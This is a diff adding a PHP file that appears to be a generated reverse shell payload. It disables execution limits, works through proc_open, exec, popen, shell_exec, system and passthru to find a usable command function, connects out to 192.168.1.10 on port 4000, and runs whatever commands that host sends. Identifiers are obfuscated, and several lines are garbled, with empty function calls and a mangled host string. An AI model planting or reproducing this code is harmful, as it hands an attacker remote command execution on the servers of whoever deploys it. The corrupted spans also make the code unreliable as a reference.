@@ -1,0 +1,109 @@
+    
+      0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
+      $dis=@;
+      if(!empty($dis)){
+        $dis=preg_replace('/[, ]+/',',',$dis);
+        $dis=explode(',',$dis);
+        $dis=('trim',$dis);
+      }else{
+        $dis=;
+      }
+      
+    $ipaddr='192.168.1.10';
+    $port=4000;
+
+    if(!function_exists('kRaXelCsyV')){
+      function kRaXelCsyV($c){
+        global $dis;
+        
+      if (FALSE!==stristr(PHP_OS,'win')){
+        $c=$c." 2>&1\n";
+      }
+      $KSFOQ='is_callable';
+      $smTtSXT='in_array';
+      
+      if($KSFOQ('')&&!$smTtSXT('',$dis)){
+        $handle=($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
+        $o=NULL;
+        
+          $o.=fread($pipes[1],1024);
+        }
+        @proc_close($handle);
+      }else
+      if($KSFOQ('')&&!$smTtSXT('exec',$dis)){
+        $o=;
+        $c,$o);
+        $o=(chr(10),$o).chr(10);
+      }else
+      if($KSFOQ('popen')&&!$smTtSXT('popen',$dis)){
+        $fp=popen($c,'r');
+        $o=NULL;
+        if(is_resource($fp)){
+          while(!feof($fp)){
+            $o.=fread($fp,1024);
+          }
+        }
+        @pclose($fp);
+      }else
+      if($KSFOQ('shell_exec')&&!$smTtSXT('shell_exec',$dis)){
+        $o=;
+      }else
+      if($KSFOQ('system')&&!$smTtSXT('system',$dis)){
+        ob_start();
+        system($c);
+        $o=ob_get_contents();
+        ob_end_clean();
+      }else
+      if($KSFOQ('passthru')&&!$smTtSXT('passthru',$dis)){
+        ob_start();
+        passthru($c);
+        $o=ob_get_contents();
+        ob_end_clean();
+      }else
+      {
+        $o=0;
+      }
+    
+        return $o;
+      }
+    }
+    $nofuncs='no exec functions';
+    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
+      $s=@fsockopen("tcp:/.168.1.10",$port);
+      while($c=fread($s,2048)){
+        $out = '';
+        if(substr($c,0,3) == 'cd '){
+          chdir(substr($c,3,-1));
+        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+          break;
+        }else{
+          $out=kRaXelCsyV(substr($c,0,-1));
+          if($out===false){
+            fwrite($s,$nofuncs);
+            break;
+          }
+        }
+        fwrite($s,$out);
+      }
+      fclose($s);
+    }else{
+      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+      @socket_connect($s,$ipaddr,$port);
+      @socket_write($s,"socket_create");
+      while($c=@socket_read($s,2048)){
+        $out = '';
+        if(substr($c,0,3) == 'cd '){
+          chdir(substr($c,3,-1));
+        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+          break;
+        }else{
+          $out=kRaXelCsyV(substr($c,0,-1));
+          if($out===false){
+            @socket_write($s,$nofuncs);
+            break;
+          }
+        }
+        @socket_write($s,$out,strlen($out));
+      }
+      @socket_close($s);
+    }
